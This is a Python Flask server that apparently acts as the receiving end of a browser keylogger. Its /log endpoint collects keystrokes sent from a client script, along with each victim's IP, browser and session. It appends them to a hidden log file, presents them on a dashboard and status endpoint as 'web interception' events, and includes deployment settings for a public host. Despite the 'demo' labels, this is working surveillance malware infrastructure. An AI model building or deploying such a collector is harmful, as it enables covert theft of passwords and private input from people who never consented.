from flask import Flask, request, send_file
from flask_cors import CORS
import os
import socket
import platform
import datetime

app = Flask(__name__)
CORS(app)

LOG_FILE = ".hidden_log.txt"

def write_to_log(data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(data)

CONNECTED_DEVICES = {}
RECENT_KEYSTROKES = []

def get_server_metadata():
    original_device_name = socket.gethostname()
    system_node_name = platform.node()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
    except Exception:
        ip_address = "127.0.0.1"
    os_name = f"{platform.system()} {platform.release()}"
    return original_device_name, system_node_name, ip_address, os_name

def parse_browser_name(user_agent):
    if "Chrome" in user_agent and "Edg" not in user_agent:
        return "Chrome"
    elif "Edg" in user_agent:
        return "Edge"
    elif "Firefox" in user_agent:
        return "Firefox"
    elif "Safari" in user_agent:
        return "Safari"
    return "Web Browser"

@app.route('/', methods=['GET'])
@app.route('/dashboard', methods=['GET'])
def index():
    return send_file(os.path.join(os.path.dirname(__file__), 'server_details.html'))

@app.route('/demo', methods=['GET'])
@app.route('/client', methods=['GET'])
def client_demo():
    client_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'clients')
    return send_file(os.path.join(client_dir, 'index.html'))

@app.route('/main.css', methods=['GET'])
def client_css():
    client_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'clients')
    return send_file(os.path.join(client_dir, 'main.css'))

@app.route('/script.js', methods=['GET'])
def client_js():
    client_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'clients')
    return send_file(os.path.join(client_dir, 'script.js'))

@app.route('/log', methods=['POST', 'OPTIONS'])
def log_web():
    if request.method == 'OPTIONS':
        return "", 204

    key = request.form.get('key') or (request.is_json and request.json.get('key')) or request.values.get('key') or "Unknown"
    user_agent = request.form.get('user_agent') or request.headers.get('User-Agent', 'Unknown Browser')
    screen_res = request.form.get('screen_res', '1920 × 1080')
    session_id = request.form.get('session_id', '5C9A-91FD-2A6C')
    client_ip = request.remote_addr or "127.0.0.1"
    
    orig_device, sys_node, server_ip, os_name = get_server_metadata()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    browser_short = parse_browser_name(user_agent)

    # Track multi-device sessions
    device_key = f"{client_ip}_{session_id}"
    if device_key not in CONNECTED_DEVICES:
        CONNECTED_DEVICES[device_key] = {
            "session_id": session_id,
            "ip": client_ip,
            "browser": browser_short,
            "resolution": screen_res,
            "os": os_name,
            "device_name": orig_device,
            "last_seen": current_time,
            "keystrokes_count": 1
        }
    else:
        CONNECTED_DEVICES[device_key]["last_seen"] = current_time
        CONNECTED_DEVICES[device_key]["keystrokes_count"] += 1

    # Format key for log file
    if key == "Enter": data = "\n"
    elif key == "Backspace": data = "[DEL]"
    elif key == " ": data = " "
    else: data = key

    write_to_log(data)

    timestamp_short = datetime.datetime.now().strftime("%H:%M:%S")
    RECENT_KEYSTROKES.append({
        "type": "WEB INTERCEPTION",
        "key": key,
        "ip": client_ip,
        "time": timestamp_short,
        "device": orig_device,
        "browser": browser_short,
        "session_id": session_id
    })
    if len(RECENT_KEYSTROKES) > 50:
        RECENT_KEYSTROKES.pop(0)

    print(f"[WEB INTERCEPTION] Key Received: '{key}' from IP: {client_ip} | Time: {current_time}", flush=True)
    print(f"  Device Name : {orig_device}", flush=True)
    print(f"  OS          : {os_name}", flush=True)
    print(f"  Browser     : {browser_short}", flush=True)
    print(f"  Session ID  : {session_id}", flush=True)
    print(f"  Active Devices: {len(CONNECTED_DEVICES)}", flush=True)
    print("-" * 50, flush=True)

    return "", 204

@app.route('/status', methods=['GET'])
def get_status():
    orig_device, sys_node, server_ip, os_name = get_server_metadata()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    connected_list = list(CONNECTED_DEVICES.values())
    return {
        "status": "ONLINE",
        "device_name": orig_device,
        "system_node": sys_node,
        "ip_address": server_ip,
        "os": os_name,
        "browser": "Python Server Engine / Flask 3.1",
        "resolution": "1920 × 1080 (Auto)",
        "keyboard_layout": "US Standard (Demo)",
        "session_id": "5C9A-91FD-2A6C",
        "current_time": current_time,
        "log_file": os.path.abspath(LOG_FILE),
        "recent_keystrokes": RECENT_KEYSTROKES,
        "connected_devices": connected_list,
        "connected_count": len(connected_list)
    }

def print_server_display():
    orig_device, sys_node, ip_address, os_name = get_server_metadata()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print("\n" + "=" * 60)
    print("              SERVER DISPLAY SESSION METADATA")
    print("=" * 60)
    print(f"  Device Name (Orig): {orig_device}")
    print(f"  System Node Name  : {sys_node}")
    print(f"  IP Address        : {ip_address}")
    print(f"  Operating System  : {os_name}")
    print(f"  Browser           : Python Server Engine / Flask 3.1")
    print(f"  Screen Resolution : Auto (System Default)")
    print(f"  Current Time      : {current_time}")
    print(f"  Keyboard Layout   : Demo (US Standard)")
    print(f"  Session ID        : 5C9A-91FD-2A6C")
    print(f"  Status            : ACTIVE")
    print("=" * 60 + "\n")

if __name__ == "__main__":
    print_server_display()

   
port = int(os.environ.get("PORT", 5000))
render_url = os.environ.get("RENDER_EXTERNAL_URL")

print("\n" + "=" * 60)

if render_url:
    print(f"Web Interception active on {render_url}/log")
else:
    print(f"Web Interception active on http://127.0.0.1:{port}/log")

print(f"System Log File: {os.path.abspath(LOG_FILE)}")
print("=" * 60 + "\n")

app.run(
    host="0.0.0.0",
    port=port,
    debug=False,
    use_reloader=False
)